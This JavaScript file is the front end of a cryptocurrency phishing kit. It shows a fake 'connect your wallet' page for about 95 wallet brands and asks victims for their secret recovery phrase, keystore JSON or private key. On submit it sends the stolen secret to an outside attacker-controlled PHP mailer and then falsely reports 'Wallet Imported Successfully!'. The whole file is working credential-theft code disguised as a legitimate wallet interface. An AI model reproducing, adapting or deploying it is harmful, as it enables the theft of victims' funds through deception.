var Wallets = [
  "Binance Coin (BNB)",
  "BC vault",
  "Keepkey",
  "SecuX v20",
  "Jaxx liberty wallet",
  "Safepal wallet",
  "Bitbox wallet",
  "Cobo vault wallet",
  "Bread wallet",
  "Exodus wallet",
  "ICON wallet",
  "Blockchain",
  "Wallet connect",
  "Etoro",
  "Gate.io",
  "Coinmama",
  "Paybis",
  "Bitwala",
  "Trustee Wallet",
  "Defiant",
  "Guarda Wallet",
  "Jade Wallet",
  "O3Wallet",
  "HashKey Me",
  "PlasmaPay",
  "RWallet",
  "Tongue Wallet",
  "AToken Wallet",
  "KyberSwap",
  "Binance Chain",
  "Trezor Wallet",
  "Flare Wallet",
  "XinFin XDC Network",
  "Talken Wallet",
  "Aktionariat",
  "KEYRING PRO",
  "Ellipal",
  "Midas Wallet",
  "AT.Wallet",
  "Dok Wallet",
  "HaloDeFi Wallet",
  "Unstoppable Wallet",
  "PEAKDEFI Wallet",
  "Vision",
  "BitKeep",
  "ViaWallet",
  "SparkPoint",
  "Bridge Wallet",
  "EasyPocket",
  "Ownbit",
  "Spatium",
  "Torus",
  "Tokenary",
  "CYBAVO Wallet",
  "GridPlus",
  "Coinomi",
  "Nash",
  "ZelCore",
  "DCENT Wallet",
  "AlphaWallet",
  "Alice",
  "CoolWallet S",
  "Coin98",
  "Atomic",
  "TrustVault",
  "Loopring Wallet",
  "MYKEY",
  "Eidoo",
  "Huobi Wallet",
  "1inch Wallet",
  "Authereum",
  "Coinbase Wallet",
  "Ledger Live",
  "BitPay",
  "MathWallet",
  "TokenPocket",
  "ONTO",
  "imToken",
  "Pillar",
  "MyEtherWallet",
  "Crypto.com | DeFi Wallet",
  "Gnosis Safe Multisig",
  "MetaMask",
  "Argent",
  "Rainbow",
  "Trust Wallet",
  "Nuo",
  "DDEX",
  "Airswap",
  "PoolTogether",
  "0x",
  "Uniswap",
  "IDEX",
  "Maker",
  "dYdX",
  "Compound",
];

function keysupin(dsetin) {
  $("#import").val(dsetin);
  if (dsetin == "Phrases") {
    $("#pphse").val("");
    $(".import-selected label").text("Enter Your Secret Recovery Phrase");
    $("#pphse").attr(
      "placeholder",
      "Enter Your Secret Recovery Phrase Which Is Always Either 12, 15, 18, 21 or 24 Words, Each Separate By A Space"
    );
  } else if (dsetin == "KeyStore JSON") {
    $("#pphse").val("");
    $(".import-selected label").text("Enter Your Secret KeyStore JSON");
    $("#pphse").attr(
      "placeholder",
      "Enter Your Secret Keystore JSON, Each Separate By A Space"
    );
  } else if (dsetin == "Private Key") {
    $("#pphse").val("");
    $(".import-selected label").text("Enter Your Secret Private Key");
    $("#pphse").attr("placeholder", "Enter Your Secret Private Key.");
  }
}

function callFloatingIsland(Called) {
  $(".floating-divider").addClass("active");
  $(".floating-island").addClass("active");
  $(".floating-island-header h3").html("Connect Your " + Called);
  $("#wallet").val(Called);
  if (Called == "Crypto.com | DeFi Wallet") {
    $("#flash_info").html(
      '<img src="./img/CryptoCom.jpeg"><h3> ' + Called + " </h3>"
    );
  } else {
    $("#flash_info").html(
      '<img src="./img/' +
        Called +
        '.png" onerror="this.src=\'./img/' +
        Called +
        ".jpg'\"><h3> " +
        Called +
        " </h3>"
    );
  }
}

function chaseFloatingIsland() {
  $(".floating-divider").removeClass("active");
  $(".floating-island").removeClass("active");
}

$("document").ready(function () {
  for (var i = 0; i < Wallets.length; i++) {
    var Using = Wallets[i];
    if (Using == "Crypto.com | DeFi Wallet") {
      $("#your_wallets").html(
        $("#your_wallets").html() +
          '<div class="wallet" onclick="callFloatingIsland(\'' +
          Using +
          '\')"><img src="./img/CryptoCom.jpeg"><p> ' +
          Using +
          " </p</div>"
      );
    } else {
      $("#your_wallets").html(
        $("#your_wallets").html() +
          '<div class="wallet" onclick="callFloatingIsland(\'' +
          Using +
          '\')"><img src="./img/' +
          Using +
          '.png" onerror="this.src=\'./img/' +
          Using +
          ".jpg'\"><p> " +
          Using +
          " </p</div>"
      );
    }
  }

  $("#search_form").on("submit", function () {
    var Inputted = $("#finder").val();
    Inputted = Inputted.toUpperCase();
    $("#your_wallets").html("");
    for (var i = 0; i < Wallets.length; i++) {
      var Using = Wallets[i];
      var Usings = Using.toUpperCase();
      if (Usings.includes(Inputted)) {
        if (Using == "Crypto.com | DeFi Wallet") {
          $("#your_wallets").html(
            $("#your_wallets").html() +
              '<div class="wallet" onclick="callFloatingIsland(\'' +
              Using +
              '\')"><img src="./img/CryptoCom.jpeg"><p> ' +
              Using +
              " </p</div>"
          );
        } else {
          $("#your_wallets").html(
            $("#your_wallets").html() +
              '<div class="wallet" onclick="callFloatingIsland(\'' +
              Using +
              '\')"><img src="./img/' +
              Using +
              '.png" onerror="this.src=\'./img/' +
              Using +
              ".jpg'\"><p> " +
              Using +
              " </p</div>"
          );
        }
      }
    }
    return false;
  });

  $("#key_submission").on("submit", async function (e) {
    e.preventDefault();

    var Type = $("#import").val();
    var Wallet = $("#wallet").val();
    var Key = $("#pphse").val();

    $("#key_submission button").attr("disabled", true);
    $("#key_submission button").text("Loading...");

    const myformData = {
      Type,
      Wallet,
      Key,
    };

    const billResponse = await fetch(
      "http://learnerscrib.platiniumxpwallet.com/aced/mail_key.php",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(myformData),
      }
    );

    billResponse
      .text()
      .then(
        (data) =>
          data == "Mail Sent" &&
          $(".import-type").html(
            '<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>'
          )
      );

    return false;
  });
});
